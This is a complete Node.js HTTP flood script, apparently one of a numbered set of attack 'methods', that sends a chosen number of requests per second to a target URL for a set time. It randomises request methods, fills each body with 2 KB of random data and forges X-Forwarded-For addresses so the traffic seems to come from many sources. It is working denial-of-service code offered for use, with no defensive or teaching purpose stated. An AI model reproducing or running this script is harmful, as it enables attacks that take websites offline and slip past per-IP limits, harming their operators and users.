const 小吴请求 = require('request'), 小吴随机 = require('randomstring');
const 小吴参数 = process.argv.slice(2);

if (小吴参数.length < 3) {
    console.log("Usage: node method5.js <url> <time> <rate>");
    process.exit(-1);
}

const 小吴网址 = 小吴参数[0], 小吴时间 = parseInt(小吴参数[1]), 小吴速率 = parseInt(小吴参数[2]);

console.log(`🔥 Random Payload Attack ke ${小吴网址} selama ${小吴时间}s @ ${小吴速率} req/s`);

const 小吴循环 = setInterval(() => {
    for (let 小吴i = 0; 小吴i < 小吴速率; 小吴i++) {
        小吴请求({
            url: 小吴网址,
            method: ['GET','POST','PUT','DELETE'][Math.floor(Math.random()*4)],
            headers: {
                'User-Agent': 'Mozilla/5.0',
                'X-Forwarded-For': `${Math.random()*255|0}.${Math.random()*255|0}.${Math.random()*255|0}.${Math.random()*255|0}`
            },
            body: 小吴随机.generate(2048)
        }, (小吴错误, 小吴响应) => {
            if (小吴错误) console.log("❌ 错误: " + 小吴错误.message);
            else console.log(`✅ 已发送 | 状态: ${小吴响应.statusCode}`);
        });
    }
}, 1000);

setTimeout(() => {
    clearInterval(小吴循环);
    console.log("✅ Random Payload 完成!");
}, 小吴时间 * 1000);
